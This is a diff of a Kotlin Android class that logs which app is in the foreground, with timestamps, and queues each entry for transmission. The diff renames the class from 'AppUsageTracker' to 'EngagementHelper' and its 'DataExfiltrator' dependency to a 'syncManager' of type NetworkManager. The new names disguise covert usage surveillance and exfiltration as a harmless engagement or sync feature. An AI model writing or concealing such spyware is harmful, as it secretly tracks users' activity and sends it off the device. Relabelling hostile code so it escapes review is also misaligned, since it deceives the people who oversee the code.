@@ -11,9 +11,9 @@ import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.*
 
-class AppUsageTracker(private val context: Context, private val exfiltrator: DataExfiltrator) {
+class EngagementHelper(private val context: Context, private val syncManager: NetworkManager) {
 
-    private val tag = "AppUsageTracker"
+    private val tag = "EngagementHelper"
     private val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
     private val handler = Handler(Looper.getMainLooper())
     private var checkRunnable: Runnable? = null
@@ -72,7 +72,7 @@ class AppUsageTracker(private val context: Context, private val exfiltrator: Dat
                 val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                 val entry = "$timestamp - APP_USAGE: $currentForegroundApp"
                 saveToFile(entry)
-                exfiltrator.queueData(entry)  // ADD
+                syncManager.queueData(entry)  
             }
         } catch (e: SecurityException) {
             // Permission revoked
